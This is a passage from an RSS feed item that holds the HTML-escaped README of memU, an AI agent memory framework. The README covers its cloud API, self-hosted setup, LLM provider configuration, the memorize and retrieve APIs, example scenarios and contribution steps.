&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üöÄ Quick Start&lt;/h2&gt; 
&lt;h3&gt;Option 1: Cloud Version&lt;/h3&gt; 
&lt;p&gt;Experience proactive memory instantly:&lt;/p&gt; 
&lt;p&gt;üëâ &lt;strong&gt;&lt;a href="https://memu.so"&gt;memu.so&lt;/a&gt;&lt;/strong&gt; - Hosted service with 7√ó24 continuous learning&lt;/p&gt; 
&lt;p&gt;For enterprise deployment with custom proactive workflows, contact &lt;strong&gt;&lt;a href="mailto:info@nevamind.ai"&gt;info@nevamind.ai&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;Cloud API (v3)&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Base URL&lt;/th&gt; 
   &lt;th&gt;&lt;code&gt;https://api.memu.so&lt;/code&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Auth&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Authorization: Bearer YOUR_API_KEY&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Method&lt;/th&gt; 
   &lt;th&gt;Endpoint&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/memorize&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Register continuous learning task&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;GET&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/memorize/status/{task_id}&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Check real-time processing status&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/categories&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;List auto-generated categories&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/retrieve&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Query memory (supports proactive context loading)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;üìö &lt;strong&gt;&lt;a href="https://memu.pro/docs#cloud-version"&gt;Full API Documentation&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Option 2: Self-Hosted&lt;/h3&gt; 
&lt;h4&gt;Installation&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install -e .
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Basic Example&lt;/h4&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;: Python 3.13+ and an OpenAI API key&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;Test Continuous Learning&lt;/strong&gt; (in-memory):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
cd tests
python test_inmemory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Test with Persistent Storage&lt;/strong&gt; (PostgreSQL):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Start PostgreSQL with pgvector
docker run -d \
  --name memu-postgres \
  -e POSTGRES_USER=postgres \
  -e POSTGRES_PASSWORD=postgres \
  -e POSTGRES_DB=memu \
  -p 5432:5432 \
  pgvector/pgvector:pg16

# Run continuous learning test
export OPENAI_API_KEY=your_api_key
cd tests
python test_postgres.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Both examples demonstrate &lt;strong&gt;proactive memory workflows&lt;/strong&gt;:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Continuous Ingestion&lt;/strong&gt;: Process multiple files sequentially&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Auto-Extraction&lt;/strong&gt;: Immediate memory creation&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Proactive Retrieval&lt;/strong&gt;: Context-aware memory surfacing&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/tests/test_inmemory.py"&gt;&lt;code&gt;tests/test_inmemory.py&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/tests/test_postgres.py"&gt;&lt;code&gt;tests/test_postgres.py&lt;/code&gt;&lt;/a&gt; for implementation details.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Custom LLM and Embedding Providers&lt;/h3&gt; 
&lt;p&gt;MemU supports custom LLM and embedding providers beyond OpenAI. Configure them via &lt;code&gt;llm_profiles&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from memu import MemUService

service = MemUService(
    llm_profiles={
        # Default profile for LLM operations
        "default": {
            "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1",
            "api_key": "your_api_key",
            "chat_model": "qwen3-max",
            "client_backend": "sdk"  # "sdk" or "http"
        },
        # Separate profile for embeddings
        "embedding": {
            "base_url": "https://api.voyageai.com/v1",
            "api_key": "your_voyage_api_key",
            "embed_model": "voyage-3.5-lite"
        }
    },
    # ... other configuration
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h3&gt;OpenRouter Integration&lt;/h3&gt; 
&lt;p&gt;MemU supports &lt;a href="https://openrouter.ai"&gt;OpenRouter&lt;/a&gt; as a model provider, giving you access to multiple LLM providers through a single API.&lt;/p&gt; 
&lt;h4&gt;Configuration&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from memu import MemoryService

service = MemoryService(
    llm_profiles={
        "default": {
            "provider": "openrouter",
            "client_backend": "httpx",
            "base_url": "https://openrouter.ai",
            "api_key": "your_openrouter_api_key",
            "chat_model": "anthropic/claude-3.5-sonnet",  # Any OpenRouter model
            "embed_model": "openai/text-embedding-3-small",  # Embedding model
        },
    },
    database_config={
        "metadata_store": {"provider": "inmemory"},
    },
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Environment Variables&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Variable&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;OPENROUTER_API_KEY&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Your OpenRouter API key from &lt;a href="https://openrouter.ai/keys"&gt;openrouter.ai/keys&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Supported Features&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Feature&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
   &lt;th&gt;Notes&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Chat Completions&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Works with any OpenRouter chat model&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Embeddings&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Use OpenAI embedding models via OpenRouter&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Vision&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Use vision-capable models (e.g., &lt;code&gt;openai/gpt-4o&lt;/code&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Running OpenRouter Tests&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENROUTER_API_KEY=your_api_key

# Full workflow test (memorize + retrieve)
python tests/test_openrouter.py

# Embedding-specific tests
python tests/test_openrouter_embedding.py

# Vision-specific tests
python tests/test_openrouter_vision.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/examples/example_4_openrouter_memory.py"&gt;&lt;code&gt;examples/example_4_openrouter_memory.py&lt;/code&gt;&lt;/a&gt; for a complete working example.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìñ Core APIs&lt;/h2&gt; 
&lt;h3&gt;&lt;code&gt;memorize()&lt;/code&gt; - Continuous Learning Pipeline&lt;/h3&gt; 
&lt;p&gt;Processes inputs in real-time and immediately updates memory:&lt;/p&gt; 
&lt;img width="100%" alt="memorize" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/memorize.png" /&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;result = await service.memorize(
    resource_url="path/to/file.json",  # File path or URL
    modality="conversation",            # conversation | document | image | video | audio
    user={"user_id": "123"}             # Optional: scope to a user
)

# Returns immediately with extracted memory:
{
    "resource": {...},      # Stored resource metadata
    "items": [...],         # Extracted memory items (available instantly)
    "categories": [...]     # Auto-updated category structure
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Features:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Zero-delay processing‚Äîmemories available immediately&lt;/li&gt; 
 &lt;li&gt;Automatic categorization without manual tagging&lt;/li&gt; 
 &lt;li&gt;Cross-reference with existing memories for pattern detection&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;&lt;code&gt;retrieve()&lt;/code&gt; - Dual-Mode Intelligence&lt;/h3&gt; 
&lt;p&gt;MemU supports both &lt;strong&gt;proactive context loading&lt;/strong&gt; and &lt;strong&gt;reactive querying&lt;/strong&gt;:&lt;/p&gt; 
&lt;img width="100%" alt="retrieve" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/retrieve.png" /&gt; 
&lt;h4&gt;RAG-based Retrieval (&lt;code&gt;method="rag"&lt;/code&gt;)&lt;/h4&gt; 
&lt;p&gt;Fast &lt;strong&gt;proactive context assembly&lt;/strong&gt; using embeddings:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Instant context&lt;/strong&gt;: Sub-second memory surfacing&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Background monitoring&lt;/strong&gt;: Can run continuously without LLM costs&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Similarity scoring&lt;/strong&gt;: Identifies most relevant memories automatically&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;LLM-based Retrieval (&lt;code&gt;method="llm"&lt;/code&gt;)&lt;/h4&gt; 
&lt;p&gt;Deep &lt;strong&gt;anticipatory reasoning&lt;/strong&gt; for complex contexts:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Intent prediction&lt;/strong&gt;: LLM infers what user needs before they ask&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Query evolution&lt;/strong&gt;: Automatically refines search as context develops&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Early termination&lt;/strong&gt;: Stops when sufficient context is gathered&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Comparison&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Aspect&lt;/th&gt; 
   &lt;th&gt;RAG (Fast Context)&lt;/th&gt; 
   &lt;th&gt;LLM (Deep Reasoning)&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Speed&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;‚ö° Milliseconds&lt;/td&gt; 
   &lt;td&gt;üê¢ Seconds&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Cost&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;üí∞ Embedding only&lt;/td&gt; 
   &lt;td&gt;üí∞üí∞ LLM inference&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Proactive use&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Continuous monitoring&lt;/td&gt; 
   &lt;td&gt;Triggered context loading&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Best for&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Real-time suggestions&lt;/td&gt; 
   &lt;td&gt;Complex anticipation&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Usage&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Proactive retrieval with context history
result = await service.retrieve(
    queries=[
        {"role": "user", "content": {"text": "What are their preferences?"}},
        {"role": "user", "content": {"text": "Tell me about work habits"}}
    ],
    where={"user_id": "123"},  # Optional: scope filter
    method="rag"  # or "llm" for deeper reasoning
)

# Returns context-aware results:
{
    "categories": [...],     # Relevant topic areas (auto-prioritized)
    "items": [...],          # Specific memory facts
    "resources": [...],      # Original sources for traceability
    "next_step_query": "..." # Predicted follow-up context
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Filtering&lt;/strong&gt;: Use &lt;code&gt;where&lt;/code&gt; to scope continuous monitoring:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;where={"user_id": "123"}&lt;/code&gt; - User-specific context&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;where={"agent_id__in": ["1", "2"]}&lt;/code&gt; - Multi-agent coordination&lt;/li&gt; 
 &lt;li&gt;Omit &lt;code&gt;where&lt;/code&gt; for global context awareness&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üí° Proactive Scenarios&lt;/h2&gt; 
&lt;h3&gt;Example 1: Always-Learning Assistant&lt;/h3&gt; 
&lt;p&gt;Continuously learns from every interaction without explicit memory commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_1_conversation_memory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Automatically extracts preferences from casual mentions&lt;/li&gt; 
 &lt;li&gt;Builds relationship models from interaction patterns&lt;/li&gt; 
 &lt;li&gt;Surfaces relevant context in future conversations&lt;/li&gt; 
 &lt;li&gt;Adapts communication style based on learned preferences&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; Personal AI assistants, customer support that remembers, social chatbots&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Example 2: Self-Improving Agent&lt;/h3&gt; 
&lt;p&gt;Learns from execution logs and proactively suggests optimizations:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_2_skill_extraction.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Monitors agent actions and outcomes continuously&lt;/li&gt; 
 &lt;li&gt;Identifies patterns in successes and failures&lt;/li&gt; 
 &lt;li&gt;Auto-generates skill guides from experience&lt;/li&gt; 
 &lt;li&gt;Proactively suggests strategies for similar future tasks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; DevOps automation, agent self-improvement, knowledge capture&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Example 3: Multimodal Context Builder&lt;/h3&gt; 
&lt;p&gt;Unifies memory across different input types for comprehensive context:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_3_multimodal_memory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Cross-references text, images, and documents automatically&lt;/li&gt; 
 &lt;li&gt;Builds unified understanding across modalities&lt;/li&gt; 
 &lt;li&gt;Surfaces visual context when discussing related topics&lt;/li&gt; 
 &lt;li&gt;Anticipates information needs by combining multiple sources&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; Documentation systems, learning platforms, research assistants&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìä Performance&lt;/h2&gt; 
&lt;p&gt;MemU achieves &lt;strong&gt;92.09% average accuracy&lt;/strong&gt; on the Locomo benchmark across all reasoning tasks, demonstrating reliable proactive memory operations.&lt;/p&gt; 
&lt;img width="100%" alt="benchmark" src="https://github.com/user-attachments/assets/6fec4884-94e5-4058-ad5c-baac3d7e76d9" /&gt; 
&lt;p&gt;View detailed experimental data: &lt;a href="https://github.com/NevaMind-AI/memU-experiment"&gt;memU-experiment&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üß© Ecosystem&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Repository&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Proactive Features&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU"&gt;memU&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Core proactive memory engine&lt;/td&gt; 
   &lt;td&gt;7√ó24 learning pipeline, auto-categorization&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU-server"&gt;memU-server&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Backend with continuous sync&lt;/td&gt; 
   &lt;td&gt;Real-time memory updates, webhook triggers&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU-ui"&gt;memU-ui&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Visual memory dashboard&lt;/td&gt; 
   &lt;td&gt;Live memory evolution monitoring&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Quick Links:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üöÄ &lt;a href="https://app.memu.so/quick-start"&gt;Try MemU Cloud&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üìö &lt;a href="https://memu.pro/docs"&gt;API Documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üí¨ &lt;a href="https://discord.gg/memu"&gt;Discord Community&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù Partners&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt;&lt;a href="https://github.com/TEN-framework/ten-framework"&gt;&lt;img src="https://avatars.githubusercontent.com/u/113095513?s=200&amp;amp;v=4" alt="Ten" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://openagents.org"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/openagents.png" alt="OpenAgents" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/milvus-io/milvus"&gt;&lt;img src="https://miro.medium.com/v2/resize:fit:2400/1*-VEGyAgcIBD62XtZWavy8w.png" alt="Milvus" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://xroute.ai/"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/xroute.png" alt="xRoute" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://jaaz.app/"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/jazz.png" alt="Jazz" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/Buddie-AI/Buddie"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/buddie.png" alt="Buddie" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/bytebase/bytebase"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/bytebase.png" alt="Bytebase" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/LazyAGI/LazyLLM"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/LazyLLM.png" alt="LazyLLM" height="40" style="margin: 10px;" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù How to Contribute&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, adding features, or improving documentation, your help is appreciated.&lt;/p&gt; 
&lt;h3&gt;Getting Started&lt;/h3&gt; 
&lt;p&gt;To start contributing to MemU, you'll need to set up your development environment:&lt;/p&gt; 
&lt;h4&gt;Prerequisites&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Python 3.13+&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/astral-sh/uv"&gt;uv&lt;/a&gt; (Python package manager)&lt;/li&gt; 
 &lt;li&gt;Git&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Setup Development Environment&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# 1. Fork and clone the repository
git clone https://github.com/YOUR_USERNAME/memU.git
cd memU

# 2. Install development dependencies
make install
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;make install&lt;/code&gt; command will:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Create a virtual environment using &lt;code&gt;uv&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Install all project dependencies&lt;/li&gt; 
 &lt;li&gt;Set up pre-commit hooks for code quality checks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Running Quality Checks&lt;/h4&gt; 
&lt;p&gt;Before submitting your contribution, ensure your code passes all quality checks:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;make check
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;make check&lt;/code&gt; command runs:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Lock file verification&lt;/strong&gt;: Ensures &lt;code&gt;pyproject.toml&lt;/code&gt; consistency&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Pre-commit hooks&lt;/strong&gt;: Lints code with Ruff, formats with Black&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Type checking&lt;/strong&gt;: Runs &lt;code&gt;mypy&lt;/code&gt; for static type analysis&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Dependency analysis&lt;/strong&gt;: Uses &lt;code&gt;deptry&lt;/code&gt; to find obsolete dependencies&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Contributing Guidelines&lt;/h3&gt; 
&lt;p&gt;For detailed contribution guidelines, code standards, and development practices, please see &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/CONTRIBUTING.md"&gt;CONTRIBUTING.md&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Quick tips:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Create a new branch for each feature or bug fix&lt;/li&gt; 
 &lt;li&gt;Write clear commit messages&lt;/li&gt; 
 &lt;li&gt;Add tests for new functionality&lt;/li&gt; 
 &lt;li&gt;Update documentation as needed&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;make check&lt;/code&gt; before pushing&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìÑ License&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/LICENSE.txt"&gt;Apache License 2.0&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üåç Community&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;GitHub Issues&lt;/strong&gt;: &lt;a href="https://github.com/NevaMind-AI/memU/issues"&gt;Report bugs &amp;amp; request features&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Discord&lt;/strong&gt;: &lt;a href="https://discord.com/invite/hQZntfGsbJ"&gt;Join the community&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;X (Twitter)&lt;/strong&gt;: &lt;a href="https://x.com/memU_ai"&gt;Follow @memU_ai&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Contact&lt;/strong&gt;: &lt;a href="mailto:info@nevamind.ai"&gt;info@nevamind.ai&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt;‚≠ê &lt;strong&gt;Star us on GitHub&lt;/strong&gt; to get notified about new releases!&lt;/p&gt; 
&lt;/div&gt;</description>
    </item>
    
  </channel>
</rss>